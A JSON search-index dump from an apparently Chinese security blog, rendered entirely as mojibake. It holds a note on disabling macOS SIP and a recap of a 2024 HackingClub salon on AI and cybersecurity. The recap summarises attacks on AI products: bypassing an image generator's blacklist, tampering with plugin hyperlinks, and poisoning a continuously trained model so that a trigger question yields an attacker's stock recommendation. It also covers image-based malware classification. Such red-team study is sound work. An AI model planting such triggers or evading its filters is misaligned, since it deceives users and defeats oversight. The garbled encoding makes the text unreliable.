å½“ç„¶è¿˜æœ‰ä¸€ç§åŠæ³•ï¼Œå°±æ˜¯ç¦ç”¨SIPï¼Œä½†æ˜¯å¼ºçƒˆä¸æ¨èï¼Œåæœè‡ªè´Ÿï¼Œæˆ‘æ²¡è¯•è¿‡ å¦‚æœç¡®å®šéœ€è¦ç¦ç”¨ SIP æ¥è¿è¡Œè„šæœ¬ï¼Œè¯·å°å¿ƒæ“ä½œï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šé™ä½ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ åœ¨ç»ˆç«¯è¿è¡Œ sudo csrutil status æ£€æŸ¥ SIP çš„çŠ¶æ€ï¼Œ ä½¿ç”¨ sudo csrutil disable ï¼Œç¦ç”¨SIPï¼ˆéœ€è¦é‡å¯ï¼‰ã€‚ ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:5:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["é—®é¢˜è§£å†³"],"content":"æ€»ç»“ åœ¨æ’æŸ¥é—®é¢˜è¿‡ç¨‹ä¸­ï¼Œè¦å°½å¯èƒ½æ‰¾ç»†èŠ‚å…¨é¢çš„æ—¥å¿—ä¿¡æ¯è¿›è¡Œè¾…åŠ©åˆ¤æ–­ã€‚ å†™ç¨‹åºè¿‡ç¨‹ä¸­ä¹Ÿè¦æ³¨æ„æŠ¥é”™ä¿¡æ¯å¤„ç†ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬æ›´å¿«å®šä½å’Œè§£å†³é—®é¢˜ã€‚ ï¼ˆåˆæ°´ä¸€ç¯‡æ–‡ç« ~ ğŸ˜† ï¼‰ ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:6:0","tags":["éšç¬”","MacOS","é—®é¢˜è§£å†³"],"title":"MacOSåˆè¯†SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"2024 HackingClub åŒ—äº¬ç«™æ²™é¾™ï¼ŒAI+ç½‘ç»œå®‰å…¨æ–¹å‘","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":" 2024 HackingClub åŒ—äº¬ç«™ äº2024å¹´3æœˆ30æ—¥ åœ¨æœé˜³é…’ä»™æ¡¥789è‰ºæœ¯åŒºæ‹½é©¬è‰ºæœ¯ç©ºé—´ä¸¾åŠã€‚ æœ¬æ¬¡åŸå¸‚æ²™é¾™è¿‘1000åç›¸å…³ä»ä¸šè€…åŠçˆ±å¥½è€…æŠ¥åï¼Œåˆ°åœºå‚ä¸äººæ•°400+ï¼Œç°åœºåº§æ— è™šå¸­ã€‚æˆ‘å»æ™šäº†ï¼Œå·®ç‚¹æ²¡åº§ã€‚ æœ¬æœŸåŸå¸‚æ²™é¾™è®®é¢˜æ–¹å‘ä¸ºAI+ç½‘ç»œå®‰å…¨ï¼Œç”±HackingClubè”åˆå‘èµ·äººã€çº¢å®¢ç¤¾åŒºè´Ÿè´£äººTNTä¸»æŒï¼Œç‰¹é‚€è‡´è¾å˜‰å®¾åœæ€å—ï¼Œæ€»å…±æœ‰6å¤§è®®é¢˜ï¼Œæ¼”è®²å˜‰å®¾åœ°å›¾å¤§å¸ˆ returnwrongã€åˆ˜æ³½éœ–ã€é™ˆå¹³ã€åˆ˜å…‰æ˜ã€nEINEIã€è·¯å»ºæ˜å¸¦æ¥ç²¾å½©è®®é¢˜åˆ†äº«ï¼ŒåŠ©åŠ›AI+ç½‘ç»œå®‰å…¨å‘å±•ã€‚ æˆ‘åœ¨æœ¬æ–‡æ€»ç»“ä¸‹è¿™æ¬¡èšä¼šçš„å¿ƒå¾—ã€‚ è®®é¢˜ä¸€ï¼šå®è·µæŒ–æ˜å›½å†…AIåœºæ™¯æ¼æ´ï¼šç§‘æŠ€å‰æ²¿ä¸å®‰å…¨æ¢ç´¢ è®®é¢˜äºŒï¼šåŸºäºYOLOV8çš„æ¶æ„è½¯ä»¶åˆ†ç±»æ–¹æ³•ç ”ç©¶ è®®é¢˜ä¸‰ï¼šå¤§æ¨¡å‹å¼•é¢†ç½‘ç»œå®‰å…¨æ™ºèƒ½åŒ–å‰æ²¿æ¢ç´¢ è®®é¢˜å››ï¼šå¤§æ¨¡å‹å®‰å…¨é˜²å¾¡ä¸AIç½‘ç»œå®‰å…¨é©æ–°ç ”ç©¶ è®®é¢˜äº”ï¼šAIåŒåˆƒå‰‘ï¼šå®è·µè§’åº¦è°ˆAIæ¨¡å‹å¼±ç‚¹ä¸ç½‘ç»œå®‰å…¨åº”ç”¨ è®®é¢˜å…­ï¼šæµ…è°ˆAIæ—¶ä»£ä¼ä¸šæ•°æ®åˆè§„è§†è§’ä¸‹çš„ç½‘ç»œå®‰å…¨ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:0:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"1ã€å®è·µæŒ–æ˜å›½å†…AIåœºæ™¯æ¼æ´ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"è®®é¢˜ç®€ä»‹ è®®é¢˜åŠ²çˆ†æ‹‰å¼€åºå¹•ï¼Œé¦–å…ˆå¸¦æ¥è®®é¢˜çš„æ˜¯åœ°å›¾å¤§å¸ˆreturnwrongï¼ˆDAY1å®‰å…¨å›¢é˜Ÿæˆå‘˜ï¼Œå¤šå®¶srcå¹´æ¦œå‰åï¼‰çš„å®è·µæŒ–æ˜å›½å†…AIåœºæ™¯æ¼æ´ï¼šç§‘æŠ€å‰æ²¿ä¸å®‰å…¨æ¢ç´¢ éšç€AIåŠŸèƒ½é€æ­¥èå…¥ç½‘ç«™ã€Appå’Œå°ç¨‹åºç­‰åº”ç”¨ï¼Œç™½å¸½é»‘å®¢å¦‚ä½•åˆ©ç”¨è¿™ä¸€æŠ€æœ¯å˜é©çš„æœºé‡ï¼Œæ›´å¥½åœ°æŒ–æ˜SRCå’Œæ¼æ´ä¼—æµ‹æˆä¸ºå…³é”®ã€‚å½“å‰å›½å†…å¸‚åœºä¸Šæ¶Œç°äº†ä¼—å¤šåªéœ€æ³¨å†Œå³å¯å…è´¹è¯•ç”¨çš„AIäº§å“ã€‚è¿™äº›äº§å“å¤šåŸºäºæ¨¡æ¿ç¨‹åºï¼Œæ”¯æŒä¸­æ–‡æ“ä½œã€‚ç„¶è€Œï¼Œè¿™äº›AIäº§å“èƒŒåçš„è¿ä½œæœºåˆ¶æ˜¯æ€æ ·çš„å‘¢ï¼Ÿå®é™…ä¸Šï¼Œå‚å•†ä¼šé¢„å…ˆè´­ä¹°ä¸€äº›å›½å¤–çš„AIæ¥å£ï¼Œå¦‚ChatGPT4ã€MidJourneyç­‰ï¼Œç„¶åè‡ªè¡Œå¼€å‘å‰ç«¯ç”¨æˆ·ç•Œé¢ã€‚ç”¨æˆ·è¾“å…¥ä¸­æ–‡æŒ‡ä»¤åï¼ŒæŒ‡ä»¤è¢«ç¿»è¯‘æˆè‹±æ–‡å¹¶ä¼ é€è‡³AIæ¥å£å¤„ç†ï¼Œæœ€ç»ˆç»“æœæ˜¾ç¤ºåœ¨å‰ç«¯é¡µé¢ä¸Šåé¦ˆç»™ç”¨æˆ·ã€‚è¿™èƒŒåå®åˆ™æ˜¯ä¸€åœºæŠ€æœ¯â€œå€’å–â€æ¸¸æˆã€‚æœ¬è®®é¢˜é€šè¿‡ä¸‰ä¸ªæ¼æ´æŒ–æ˜å®ä¾‹ï¼ŒçœŸæ­£ä»¥æ¼æ´æŒ–æ˜è€…çš„è§†è§’åˆ†æäº†è¿™ä¸€è¿‡ç¨‹ä¸­å­˜åœ¨çš„é—®é¢˜ã€‚ IDï¼šåœ°å›¾å¤§å¸ˆreturnwrong Day1å®‰å…¨å›¢é˜Ÿæˆå‘˜ï¼Œçƒ­çˆ±æ¼æ´æŒ–æ˜ã€æŠ€æœ¯åˆ†äº«ï¼š 2023å¹´æ™ºè”SRCç¬¬5 2023å¹´é“¶è”SRCç¬¬10 2023å¹´çŸ¥è¯†æ˜ŸçƒSRCç¬¬4 2022å¹´çŒè˜SRCç¬¬8 2022å¹´BOSSç›´è˜SRCç¬¬7 éšç€AIåŠŸèƒ½é€æ­¥èå…¥ç½‘ç«™ã€Appå’Œå°ç¨‹åºç­‰åº”ç”¨ï¼Œç™½å¸½é»‘å®¢å¦‚ä½•åˆ©ç”¨è¿™ä¸€æŠ€æœ¯å˜é©çš„æœºé‡ï¼Œæ›´å¥½åœ°æŒ–æ˜SRCå’Œæ¼æ´ä¼—æµ‹æˆä¸ºå…³é”®ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:1","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"å›½å†…AIäº§å“ç°çŠ¶ç®€å•è®²è§£ ç›®å‰å›½å†…æœ‰ä¼—å¤šåªéœ€æ³¨å†Œå³å¯å…è´¹è¯•ç”¨çš„AIäº§å“ï¼Œè¿™äº›äº§å“å¤§å¤šä¸ºåŸºäºæ¨¡æ¿çš„ç¨‹åºï¼Œä¸”å®Œå…¨æ”¯æŒä¸­æ–‡æ“ä½œï¼Œä½†èƒŒåçš„è¿ä½œæœºåˆ¶å¦‚ä½•å‘¢ï¼Ÿå…¶å®å‚å•†ä¼šé¢„å…ˆè´­ä¹°ä¸€äº›å¦‚ChatGPTã€MidJourneyç­‰å›½å¤–çš„AIæ¥å£ï¼Œç„¶åè‡ªè¡Œå¼€å‘ä¸€å¥—å‰ç«¯ç”¨æˆ·ç•Œé¢ï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸­æ–‡æŒ‡ä»¤åï¼Œè¿™äº›æŒ‡ä»¤å°†è¢«ç¿»è¯‘æˆè‹±æ–‡å¹¶ä¼ é€åˆ°è´­ä¹°çš„AIæ¥å£è¿›è¡Œå¤„ç†ï¼Œæœ€åå°†å¤„ç†ç»“æœå‘ˆç°åœ¨å‰ç«¯é¡µé¢ä¸Šåé¦ˆç»™ç”¨æˆ·ã€‚è¿™èƒŒåå®åˆ™æ˜¯ä¸€åœºæŠ€æœ¯â€œå€’å–â€æ¸¸æˆã€‚ æ•´ä½“æµç¨‹ï¼šç”¨æˆ·è¾“å…¥ â€“\u003e å‰å°é¡µé¢ â€“\u003e åå°ç¿»è¯‘ â€“\u003e å›½å¤–æ¥å£ â€“\u003e æ–‡å­—ã€è§†é¢‘å›¾åƒç­‰ â€“\u003e å‰å°é¡µé¢å‘ˆç° ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:2","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"æ¡ˆä¾‹ æœ¬è®®é¢˜é€šè¿‡ä¸‰ä¸ªæ¼æ´æŒ–æ˜å®ä¾‹ï¼ŒçœŸæ­£ä»¥æ¼æ´æŒ–æ˜è€…çš„è§†è§’åˆ†æäº†è¿™ä¸€è¿‡ç¨‹ä¸­å­˜åœ¨çš„é—®é¢˜ã€‚ 1 - ç”Ÿæˆå¼å›¾ç‰‡AIæ¼æ´æ¡ˆä¾‹ è¯¥æ¡ˆä¾‹æ˜¯ç»•è¿‡äº†AIçš„é»‘åå•é™åˆ¶ï¼Œå¯¼è‡´å¯ç”Ÿæˆä¸ç¬¦åˆæ ¸å¿ƒä»·å€¼è§‚çš„å›¾ç‰‡ã€‚å±å®³åœ¨äºå½±å“äº§å“å£ç¢‘ï¼Œä¸”ä¼šè¢«ç›‘ç®¡å•ä½å¤„ç½šã€‚ 2 - å¤§è¯­è¨€æ¨¡å‹â€œæ’ä»¶â€æ¼æ´æ¡ˆä¾‹ è®°ä¸æ¸…äº†ï¼Œå¤§æ¦‚æ˜¯æœ‰ä¸ªæ’ä»¶åŠŸèƒ½æ˜¯æ£€ç´¢Githubä¿¡æ¯å¹¶è¿”å›ï¼Œåœ¨åˆ†äº«è¿‡ç¨‹ä¸­ä¼šæœ‰è¶…é“¾æ¥ï¼Œè€Œè¿™ä¸ªè¶…é“¾æ¥æ˜¯å¯ä»¥ç¯¡æ”¹çš„ã€‚ 3 - AIæŠ•æ¯’æ¡ˆä¾‹è®²è§£ è¯¥æ¡ˆä¾‹æ˜¯å‘ç”Ÿåœ¨æŸæ¬¾è¾¹ä½¿ç”¨è¾¹è®­ç»ƒçš„AIä¸Šï¼Œå¯¼è‡´ç”¨æˆ·è¾“å…¥å¯è¢«ç”¨äºè®­ç»ƒAIï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§¦å‘æ”»å‡»è€…é¢„è®¾çš„æ¶æ„å…³é”®è¯åï¼Œä¼šè¿”å›æ”»å‡»è€…é¢„æœŸçš„è¾“å‡ºã€‚ è¿™é‡Œè®²çš„æ¡ˆä¾‹åœºæ™¯æ˜¯ï¼Œæ”»å‡»è€…å‘Šè¯‰AIï¼Œå½“åˆ«äººè¯¢é—®æ¨èä»€ä¹ˆè‚¡ç¥¨æ—¶ï¼Œè®©AI æ¨è 14433è‚¡ç¥¨ã€‚å½“å—å®³è€…åœ¨è¯¢é—®AIæ—¶è§¦å‘ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:3","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"2ã€åŸºäºYOLOV8çš„æ¶æ„è½¯ä»¶åˆ†ç±»æ–¹æ³•ç ”ç©¶ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"è®®é¢˜ç®€ä»‹ éšåæ˜¯è¡¡æ°´ä¸­å­¦é«˜äºŒæ–‡ç§‘ç”Ÿâ€”â€”åˆ˜æ³½éœ–ï¼ˆæ²³åŒ—è¡¡æ°´ä¸­å­¦åœ¨è¯»ï¼ŒHacking Group 0318å‘èµ·äººï¼‰å¸¦æ¥çš„åŸºäºYOLOv8çš„æ¶æ„è½¯ä»¶åˆ†ç±»æ–¹æ³•ç ”ç©¶ã€‚ æœ¬ç ”ç©¶èšç„¦å‰æ²¿çš„YOLOv8æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œåˆ›æ–°æ€§åœ°é€šè¿‡å›¾åƒåŒ–æŠ€æœ¯å°†æ¶æ„ä»£ç è½¬åŒ–ä¸ºRGBå›¾åƒï¼Œæ„å»ºé«˜æ•ˆçš„åˆ†ç±»æ£€æµ‹ç³»ç»Ÿã€‚é€šè¿‡ä¸°å¯Œæ¶æ„è½¯ä»¶å›¾åƒç‰¹å¾æ•°æ®é›†å¹¶ä¼˜åŒ–æ¨¡å‹ï¼Œå¤§å¹…æå‡æ£€æµ‹å‡†ç¡®æ€§å’Œæ•ˆç‡ã€‚ å®éªŒéªŒè¯ä¸æ•°æ®åˆ†æè¯å®ï¼Œè¯¥æ–¹æ³•èƒ½æœ‰æ•ˆåŒºåˆ†ä¸åŒæ¶æ„è½¯ä»¶ï¼Œå¹¶æ¢ç´¢äº†è¿›ä¸€æ­¥ä¼˜åŒ–å¯èƒ½æ€§ã€‚ æœ¬ç ”ç©¶ä¸ä»…æ‹“å±•äº†YOLOv8åœ¨ç½‘ç»œå®‰å…¨çš„åº”ç”¨ï¼Œä¹Ÿä¸ºæ¶æ„è½¯ä»¶æ£€æµ‹ä¸é˜²å¾¡æä¾›æ–°æ€è·¯ã€‚ æ•´ä¸ªè®®é¢˜åå‘å­¦æœ¯æ€§ï¼Œæœ‰ä¸€ç§çœ‹è®ºæ–‡çš„æ„Ÿè§‰ã€‚è¿™ä¸ªè®®é¢˜è®©æˆ‘å°è±¡æ·±åˆ»çš„åŸå› æ˜¯ï¼Œæ¶æ„è½¯ä»¶çš„å›¾åƒåŒ–ï¼Œä¹‹å‰æ²¡æœ‰æ¥è§¦è¿‡ç›¸å…³å†…å®¹ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:1","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"æ¶æ„è½¯ä»¶å›¾åƒåŒ–æŠ€æœ¯ï¼š è™½ç„¶æ¶æ„è½¯ä»¶æŒç»­è¿›åŒ–ï¼Œä½†å°†å…¶è½¬æ¢ä¸ºå›¾åƒåï¼Œè§†è§‰æ–¹æ³•æ¯”ä¼ ç»Ÿæ–¹æ³•åœ¨æ£€æµ‹å’Œåˆ†ç±»ä¸Šæ›´æœ‰æ•ˆã€‚è¿™äº›å›¾å½¢åŒ…å«å…³é”®ä¿¡æ¯ï¼ŒåŒå®¶æ—çš„æ¶æ„è½¯ä»¶å›¾åƒç›¸ä¼¼ï¼Œä¸åŒå®¶æ—åˆ™æœ‰æ˜¾è‘—å·®å¼‚ã€‚ç”±äºæ¶æ„ä»£ç å˜ä½“é€šå¸¸ç”±è‡ªåŠ¨åŒ–æŠ€æœ¯æˆ–é‡ç”¨æ¨¡å—ç”Ÿæˆï¼Œå®ƒä»¬åœ¨äºŒè¿›åˆ¶ä»£ç ä¸­å­˜åœ¨å…±æ€§ã€‚ç ”ç©¶è€…ä»¬ä¸»è¦é‡‡ç”¨ä¸¤ç§æ–¹æ³•ç ”ç©¶æ¶æ„è½¯ä»¶å¯è§†åŒ–ï¼šä¸€æ˜¯æå–å›¾åƒçº¹ç†æˆ–ç»“æ„ç‰¹å¾ï¼Œç»“åˆæœºå™¨å­¦ä¹ è¿›è¡Œæ£€æµ‹å’Œåˆ†ç±»ï¼›äºŒæ˜¯ä½¿ç”¨æ·±åº¦å­¦ä¹ è‡ªåŠ¨æå–ç‰¹å¾ï¼Œä»¥å¯¹æŠ—æ··æ·†æŠ€æœ¯ã€‚ä¸ºè·å–æ›´å¤šç‰¹å¾ï¼Œæœ‰ç ”ç©¶å°†æ¶æ„è½¯ä»¶è½¬ä¸ºå½©è‰²å›¾åƒã€‚è¿˜æœ‰åŸºäºå¯è§†åŒ–çš„æ–¹æ³•ï¼Œå³ä½¿ä¸ä½¿ç”¨æœºå™¨å­¦ä¹ æˆ–æ·±åº¦å­¦ä¹ ï¼Œä¹Ÿèƒ½æœ‰æ•ˆåœ°æ£€æµ‹æ¶æ„è½¯ä»¶ å¤§é‡æ¶æ„ä»£ç éƒ½ä½¿ç”¨äº†ä»£ç å¤ç”¨æŠ€æœ¯ï¼Œå› æ­¤åŒç±»ä»£ç é€šå¸¸å«æœ‰ç›¸åŒçš„æ¨¡å—ï¼Œä»£ç å­˜åœ¨ç›¸ä¼¼æ€§ã€‚è€Œä¸åŒç±»ä»£ç å­˜åœ¨ç›¸å¼‚æ€§ã€‚å›¾åƒçº¹ç†ç‰¹å¾èƒ½æœ‰æ•ˆåæ˜ è¿™ç§ç›¸ä¼¼æ€§å’Œå·®å¼‚æ€§ã€‚åœ¨ç°åº¦å›¾ä¸­ï¼Œä»»ä½•é¢œè‰²éƒ½æ˜¯ç”±çº¢ã€ç»¿ã€è“ä¸‰åŸè‰²ä»¥ç›¸åŒçš„å¼ºåº¦ç»„åˆè€Œæˆçš„ï¼Œè¿™æ ·å°±å½¢æˆäº†ä»å…¨é»‘ï¼ˆ0ç°åº¦ç­‰çº§ï¼‰åˆ°å…¨ç™½ï¼ˆ255ç°åº¦ç­‰çº§ï¼‰çš„256ä¸ªç°åº¦ç­‰çº§ã€‚å¯æ‰§è¡Œæ–‡ä»¶éƒ½ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨ï¼Œæ¯8bitæ•°æ®æ­£å¥½è¦†ç›–ç°åº¦å›¾æ¯ä¸ªç°åº¦å€¼ï¼Œè½¬æˆæ–¹å½¢ä»¥åå°±æ˜¯ç°åº¦å›¾ã€‚ â€‹ å¤„ç†æµç¨‹ï¼š æ•°æ®è½¬æ¢ï¼šå°†æ¶æ„è½¯ä»¶äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºå›¾åƒè¿›è¡Œæå–ï¼Œæœ‰åŠ©äºè¯†åˆ«æ¶æ„è½¯ä»¶çš„ç‰¹å¾ ç‰¹å¾æå–ï¼šä»ç”Ÿæˆçš„å›¾åƒä¸­æå–çº¹ç†ã€é¢œè‰²åˆ†å¸ƒã€å½¢çŠ¶ã€ç»“æ„ç­‰ç‰¹å¾ã€‚ åˆ†ç±»å’Œæ£€æµ‹ï¼šä½¿ç”¨æœºå™¨å­¦ä¹ æˆ–æ·±åº¦å­¦ä¹ ç®—æ³•å¯¹æå–çš„ç‰¹å¾è¿›è¡Œåˆ†æï¼Œè¯†åˆ«å’Œåˆ†ç±»æ¶æ„è½¯ä»¶ å¯è§†åŒ–å±•ç¤ºï¼šå°†åˆ†ç±»å’Œæ£€æµ‹çš„ç»“æœä»¥å¯è§†åŒ–çš„å½¢å¼å±•ç¤ºå‡ºæ¥ï¼Œå¸®åŠ©åˆ†æå¸ˆç›´è§‚åœ°ç†è§£æ¶æ„è½¯ä»¶çš„è¡Œä¸ºå’Œç‰¹å¾ã€‚ â€‹ äºŒè¿›åˆ¶æ–‡ä»¶è½¬ä¸ºç°åº¦å›¾ä¼ªä»£ç ï¼š function calculate TextureFeatures(binaryData): grayScalelmage = convertToGrayScaleï¼ˆbinaryDataï¼‰ // å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºç°åº¦å›¾åƒ textureFeatures = extractTextureFeaturesï¼ˆgrayScalelmageï¼‰ // æå–çº¹ç†ç‰¹å¾ return textureFeatures function convertToGrayScale(binaryData): // å®ç°å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºç°åº¦å›¾åƒçš„ç®—æ³• // æ¯8ä½æ•°æ®å¯¹åº”ä¸€ä¸ªç°åº¦å€¼ï¼Œå¯ä»¥æ ¹æ®ç°åº¦ç­‰çº§è½¬æ¢æˆç°åº¦å›¾åƒ // è¿”å›ç°åº¦å›¾åƒæ•°æ® function extractTextureFeatures(grayScalelmage): // å®ç°æå–çº¹ç†ç‰¹å¾çš„ç®—æ³• // å¯ä»¥ä½¿ç”¨å„ç§å›¾åƒå¤„ç†æŠ€æœ¯ï¼Œå¦‚çº¹ç†åˆ†æã€ç»Ÿè®¡ç‰¹å¾æå–ç­‰ // è¿”å›çº¹ç†ç‰¹å¾å‘é‡æˆ–æè¿°å­ //ä¸»ç¨‹åº binaryData = readBinaryFileï¼ˆ\"executable_file.exe\"ï¼‰// è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶æ•°æ® texturefeatures = calculateTextureFeaturesï¼ˆbinaryDataï¼‰ // è®¡ç®—çº¹ç†ç‰¹å¾ printï¼ˆtextureFeaturesï¼‰ // æ‰“å°çº¹ç†ç‰¹å¾ é‡æ–°ç¼–ç äºŒè¿›åˆ¶æ•°æ®ä»¥å½¢æˆå¤šé€šé“å½©è‰²å›¾åƒï¼Œæ¯3ä¸ªå­—èŠ‚å¯¹åº”äºçº¢ã€ç»¿ã€è“ä¸‰è‰²é€šé“çš„åƒç´ å€¼ã€‚é‡å¤æ­¤è¿‡ç¨‹ç›´åˆ°æ‰€æœ‰æ•°æ®è¢«ä½¿ç”¨ï¼Œä¸è¶³3å­—èŠ‚çš„æœ«å°¾æ•°æ®ç”¨0è¡¥è¶³ã€‚ä¾‹å¦‚ï¼Œ52D586=ï¼ˆR: 82, G: 213, B: 134ï¼‰ï¼ŒAA3033=ï¼ˆR: 170, G: 48, B: 51ï¼‰ã€‚å°†ä»£ç æ–‡ä»¶è½¬æ¢ä¸ºä¸€ç»´åƒç´ åºåˆ—åï¼Œè¿›è¡Œæ­£æ–¹åŒ–å¤„ç†ï¼Œç”Ÿæˆå½©è‰²å›¾åƒã€‚å›¾3å±•ç¤ºäº†å°†å¯æ‰§è¡Œæ–‡ä»¶è½¬æ¢ä¸ºRGBå›¾åƒçš„è¿‡ç¨‹ï¼š å›¾3ï¼ˆaï¼‰æ˜¾ç¤ºäº†æŸæ¶æ„ä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶æ•°æ®ï¼›å›¾3ï¼ˆbï¼‰å±•ç¤ºäº†å°†å¯æ‰§è¡Œæ–‡ä»¶æŒ‰å­—èŠ‚é‡æ–°ç¼–ç åçš„åƒç´ åºåˆ—ï¼›å›¾3ï¼ˆcï¼‰å±•ç¤ºäº†å°†åƒç´ åºåˆ—è¿›è¡Œæ­£æ–¹åŒ–åç”Ÿæˆçš„å½©è‰²å›¾ç‰‡ã€‚ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:2","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"3ã€å¤§æ¨¡å‹å¼•é¢†ç½‘ç»œå®‰å…¨æ™ºèƒ½åŒ–å‰æ²¿æ¢ç´¢ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:0","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"è®®é¢˜ç®€ä»‹ æ¥ä¸‹æ¥æ˜¯é™ˆå¹³ï¼ˆä¸‡å¾„å®‰å…¨å®‰å…¨ç ”å‘å·¥ç¨‹å¸ˆï¼‰å¸¦æ¥çš„å¤§æ¨¡å‹å¼•é¢†ç½‘ç»œå®‰å…¨æ™ºèƒ½åŒ–å‰æ²¿æ¢ç´¢ è®®é¢˜å›´ç»•å®é™…åœºæ™¯ç ”ç©¶å¤§æ¨¡å‹åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„æ™ºèƒ½åŒ–åº”ç”¨æ–¹æ³•åŠæ”¶ç›Šï¼Œæ¶µç›–æ¶æ„è®¾è®¡ã€æ•°æ®æ²»ç†ã€çŸ¥è¯†é—®ç­”å’Œå¤šæ™ºèƒ½ä½“è”åŠ¨ç­‰æ–¹é¢ã€‚ è¯¦ç»†ä»‹ç»çŸ¥è¯†å›¾è°±ã€æç¤ºè¯å‹ç¼©ç­‰çŸ¥è¯†æ³¨å…¥æŠ€æœ¯å¯¹å¤§æ¨¡å‹çš„èµ‹èƒ½å’Œä»·å€¼ï¼Œå¹¶åˆ†äº«åœ¨çº¢è“å¯¹æŠ—ã€ä»£ç ç”Ÿæˆã€å®‰å…¨è¿è¥å’Œå¨èƒæº¯æºç­‰åœºæ™¯ä¸­ï¼Œå¤§æ¨¡å‹çš„å…·ä½“æ„å»ºè¿‡ç¨‹å’Œåº”ç”¨å®è·µæ•ˆæœã€‚ è½åœ°åº”ç”¨å·¥å…·æ„å»ºåŠä¼˜åŒ–ç»éªŒåˆ†äº« ä¸»è¦ç ”ç©¶æ–¹å‘ï¼šçº¢é˜Ÿå·¥å…·ç ”å‘ã€å›ºä»¶å®‰å…¨ã€çŸ¥è¯†å›¾è°±æ„å»ºåŠåº”ç”¨ã€äººå·¥æ™ºèƒ½åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸåº”ç”¨ ï¼ˆPOMDPã€DRLã€LLMsï¼‰ ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:1","tags":["éšç¬”","career","AIå®‰å…¨"],"title":"2024 HackingClubåŒ—äº¬ç«™æ²™é¾™åˆ†äº«","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["èŒä¸šç”Ÿæ¶¯","è®®é¢˜åˆ†äº«","éšç¬”"],"content":"å®‰å…¨ä½“ç³»æ™ºèƒ½ä½“æ„å»ºåŠåº”ç”¨ è¿™ç§æ™ºèƒ½ä½“å¢åŠ 